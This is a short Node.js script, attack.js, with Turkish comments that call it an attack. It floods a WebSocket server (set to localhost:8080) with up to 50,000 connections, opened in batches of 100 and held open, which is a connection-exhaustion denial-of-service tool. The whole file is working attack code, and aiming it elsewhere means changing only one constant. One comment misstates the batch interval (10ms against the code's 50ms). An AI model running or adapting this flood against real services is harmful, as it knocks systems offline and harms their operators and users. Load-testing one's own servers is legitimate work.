// Dosya: attack.js
const WebSocket = require('ws');

const TARGET = 'ws://localhost:8080';
const CONNECTIONS = 50000; 
const BATCH_SIZE = 100;    // Her 10ms'de 100 bağlantı aç

let active = 0;

console.log(`🌊 SALDIRI BAŞLIYOR... Hedef: ${TARGET}`);

const interval = setInterval(() => {
    if (active >= CONNECTIONS) {
        clearInterval(interval);
        console.log("✅ Hedefe ulaşıldı. Bağlantılar açık tutuluyor...");
        return;
    }

    for (let i = 0; i < BATCH_SIZE; i++) {
        const ws = new WebSocket(TARGET);
        
        ws.on('open', () => {
            active++;
        });

        ws.on('error', (e) => {
            // OS limitine takılırsan burası patlar okayyyy
        });
        
        ws.on('close', () => {
            active--;
        });
    }
    
    // İlerleme çubuğu
    process.stdout.write(`\r💥 Aktif Saldırı: ${active}`);

}, 50);